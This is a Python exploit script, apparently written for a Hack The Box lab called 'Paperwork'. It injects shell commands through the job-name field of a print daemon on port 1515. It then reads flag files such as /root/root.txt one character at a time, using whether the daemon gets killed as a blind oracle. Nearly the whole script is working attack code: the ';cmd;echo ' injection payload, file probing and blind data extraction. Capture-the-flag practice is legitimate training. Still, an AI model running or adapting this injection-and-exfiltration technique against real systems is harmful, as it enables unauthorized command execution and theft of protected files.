#!/usr/bin/env python3
"""
Timing-based flag oracle for HTB Paperwork.
Exploits the daemon auto-restart: if our injection kills the daemon (pkill),
we'll see a connection timeout on the next attempt. One bit per attempt.
"""
import socket, time, sys, re

TARGET = '10.129.38.158'

def lpd_inject(job_name, timeout=8):
    """Send a print job with injection in the job name."""
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.15)
        s.recv(1024)
        ct = (f'J{job_name}\n').encode()
        s.send(b'\x01\x00\x00\x00\n' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.3)
        s.recv(4096)
    except:
        pass
    finally:
        s.close()

def daemon_alive():
    """Check if daemon is responsive by sending \x03."""
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x03')
        d = s.recv(4096)
        s.close()
        return True
    except:
        return False

def test_char(pos, char, flag_path):
    """Test if flag[pos] == char. Returns True if match."""
    # Injection: read flag, check char at pos, if match kill daemon
    cmd = f"c=$(cat {flag_path} 2>/dev/null);if [ \"${{c:{pos}:1}}\" = \"{char}\" ];then pkill -f server.py;fi"
    lpd_inject(f"';{cmd};echo '")
    time.sleep(0.1)
    alive = daemon_alive()
    if not alive:
        # Daemon was killed - char matched!
        # Wait for restart before continuing
        for _ in range(20):
            time.sleep(0.5)
            if daemon_alive():
                break
        return True
    return False

def oracle_extract(flag_path, charset, start_pos=0, known_prefix=""):
    """Extract flag using kill/no-kill oracle."""
    result = list(known_prefix)
    pos = start_pos
    
    while True:
        found = False
        for char in charset:
            sys.stdout.write(f"\rPos {pos}: trying '{char}'... ")
            sys.stdout.flush()
            if test_char(pos, char, flag_path):
                result.append(char)
                sys.stdout.write(f"HIT! -> '{''.join(result)}'\n")
                sys.stdout.flush()
                found = True
                break
        
        if not found:
            if result and result[-1] == '}':
                print(f"\nFlag complete: {''.join(result)}")
                break
            elif pos == start_pos and not known_prefix:
                print(f"\nNo character matched at position {pos}. File might not exist.")
                break
            else:
                # Try newline or end of file
                print(f"\nNo match at pos {pos}. Assuming end of flag.")
                break
        
        pos += 1
    
    return ''.join(result)

# First: try to read /home/*/user.txt by checking if the file exists
print("=== Step 1: Find the flag location ===", flush=True)

# Check common locations
locations = [
    '/home/*/user.txt',
    '/home/dave/user.txt',
    '/home/paper/user.txt',
    '/home/paperwork/user.txt',
    '/user.txt',
    '/flag.txt',
    '/root/root.txt',
]

for loc in locations:
    cmd = f"test -f {loc}"
    lpd_inject(f"';{cmd} && pkill -f server.py;echo '")
    time.sleep(0.1)
    alive = daemon_alive()
    if not alive:
        print(f"  Found flag at: {loc}", flush=True)
        flag_path = loc
        # Wait for restart
        for _ in range(20):
            time.sleep(0.5)
            if daemon_alive():
                break
        break
else:
    print("  Could not find flag location with wildcard.", flush=True)
    # Try reading dir listing
    lpd_inject(f"';ls /home/ > /tmp/homedirs 2>/dev/null;pkill -f server.py;echo '")
    time.sleep(0.1)
    alive = daemon_alive()
    if not alive:
        print("  /home/ exists (daemon killed). Reading dirs...", flush=True)
    else:
        print("  /home/ doesn't exist or not accessible", flush=True)
    sys.exit(1)

# Wait a bit more for daemon to stabilize
time.sleep(3)

# Step 2: Now extract the flag character by character
print(f"\n=== Step 2: Extract flag from {flag_path} ===", flush=True)

# First get the length
print("Determining flag length...", flush=True)
flag_len = 0
for i in range(1, 100):
    cmd = f"c=$(cat {flag_path} 2>/dev/null);test -n \"${{c:{i}:1}}\""
    lpd_inject(f"';{cmd} && pkill -f server.py;echo '")
    time.sleep(0.1)
    alive = daemon_alive()
    if not alive:
        flag_len = i
        for _ in range(20):
            time.sleep(0.5)
            if daemon_alive(): break
    else:
        break

print(f"Flag length appears to be: {flag_len} characters", flush=True)

# Now extract each character using binary search on ASCII
# But for speed, just try common HTB flag characters
# HTB{0123456789abcdef}
charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()")

time.sleep(2)

print("\nStarting character-by-character extraction...", flush=True)
flag = ""
for pos in range(flag_len):
    found = False
    for char in charset:
        sys.stdout.write(f"\r  Pos {pos}: trying '{char}'... ")
        sys.stdout.flush()
        if test_char(pos, char, flag_path):
            flag += char
            sys.stdout.write(f"MATCH! Flag so far: {flag}\n")
            sys.stdout.flush()
            found = True
            break
    
    if not found:
        print(f"\n  Pos {pos}: No match found, trying raw byte...", flush=True)
        # Maybe it's a non-printable character, try all bytes
        for byte_val in range(256):
            char = chr(byte_val)
            if char in charset: continue  # already tried
            sys.stdout.write(f"\r  Pos {pos}: byte {byte_val}... ")
            sys.stdout.flush()
            if test_char(pos, char, flag_path):
                flag += char
                sys.stdout.write(f"MATCH! ({repr(char)}) Flag so far: {flag}\n")
                sys.stdout.flush()
                found = True
                break
        
        if not found:
            print(f"\n  Pos {pos}: Cannot determine character. Stopping.", flush=True)
            break
    
    time.sleep(0.2)

print(f"\n=== EXTRACTION COMPLETE ===", flush=True)
print(f"Flag: {flag}", flush=True)

# Save to file
with open('/tmp/extracted_flag.txt', 'w') as f:
    f.write(flag)
print(f"Saved to /tmp/extracted_flag.txt", flush=True)
